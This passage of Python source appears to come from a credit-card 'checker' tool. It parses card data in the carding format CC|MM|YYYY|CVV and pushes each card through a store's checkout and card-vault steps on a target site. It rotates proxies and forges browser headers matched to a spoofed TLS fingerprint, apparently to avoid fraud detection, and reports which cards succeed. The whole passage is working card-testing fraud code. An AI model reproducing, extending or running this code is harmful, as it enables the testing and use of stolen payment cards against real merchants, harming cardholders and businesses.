        except Exception as e:
            return False, f"Checkout error: {str(e)}", gateway, total_price, currency
        finally:
            try:
                await session.aclose()
            except Exception:
                pass

    except Exception as e:
        return False, f"Fatal error: {str(e)}", gateway, total_price, currency


# =====================================================================
# CARD STRING PARSER
# =====================================================================
def parse_cc_string(cc_string):
    """Parse credit card string in format: CC|MM|YYYY|CVV or CC|MM|YY|CVV"""
    if not cc_string:
        return None, None, None, None

    parts = cc_string.strip().split('|')
    if len(parts) != 4:
        return None, None, None, None

    cc, mes, ano, cvv = [p.strip() for p in parts]

    if not cc or not cc.isdigit():
        return None, None, None, None
    if not mes or not mes.isdigit():
        return None, None, None, None
    month = int(mes)
    if month < 1 or month > 12:
        return None, None, None, None
    if not ano or not ano.isdigit():
        return None, None, None, None
    year = int(ano)
    if year < 100:
        year += 2000
    if not cvv or not cvv.isdigit():
        return None, None, None, None

    return cc, str(month), str(year), cvv


# =====================================================================
# ASYNC WRAPPER
# =====================================================================
async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, shared_session=None):
    """Async wrapper for process_card with error handling."""
    try:
        result = await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str, shared_session=shared_session)
        success, message, gateway, price, currency = result
        print(f"[process_card_async] site={site_url} success={success} msg={message} gateway={gateway} price={price}", file=sys.stderr)
        return result
    except Exception as e:
        print(f"[process_card_async] FATAL: site={site_url} error={e}", file=sys.stderr)
        return False, f"process_card_async error: {str(e)}", "UNKNOWN", "0.00", "USD"


# =====================================================================
# COMPATIBILITY FUNCTIONS (for api_litestar.py imports)
# =====================================================================
def _init_proxy_rotator(proxy_str=None):
    """Compatibility: returns proxy URL directly (same as _init_proxy)."""
    return _init_proxy(proxy_str)


def _build_headers(identifier, base_headers=None, extra_headers=None):
    """Build full headers dict matching the TLS identifier's client hints."""
    hints = _get_client_hints(identifier)
    headers = {
        'User-Agent': hints['ua'],
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/json',
        'sec-ch-ua': hints['sec_ch_ua'],
        'sec-ch-ua-full-version-list': hints['sec_ch_ua_full'],
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': hints['platform'],
        'sec-ch-ua-arch': '"x86"',
        'sec-ch-ua-bitness': '"64"',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-wow64': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
    }
    if base_headers:
        headers.update(base_headers)
    if extra_headers:
        headers.update(extra_headers)
    return headers


def _referrer_for(step, ourl=None, checkout_url=None):
    """Return the correct Referer header for each checkout step."""
    if step == 'homepage':
        return None
    elif step == 'cart':
        return ourl
    elif step == 'checkout':
        return ourl
    elif step == 'graphql':
        return checkout_url or ourl
    elif step == 'pci_vault':
        return None
    elif step == 'poll':
        return checkout_url or ourl
    return ourl


async def _submit_with_warm_session(warm_session, cc, mes, ano, cvv):
    """Submit a card check using a pre-warmed session.
    Delegates to process_card directly since warm sessions
    aren't fully supported with the new negotiation flow.
    """
    site_url = getattr(warm_session, 'site_url', None)
    proxy_str = getattr(warm_session, 'proxy_str', None)
    variant_id = getattr(warm_session, 'variant_id', None)

    if not site_url:
        return False, "Warm session has no site_url", "UNKNOWN", "0.00", "USD"

    result = await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)
    return result
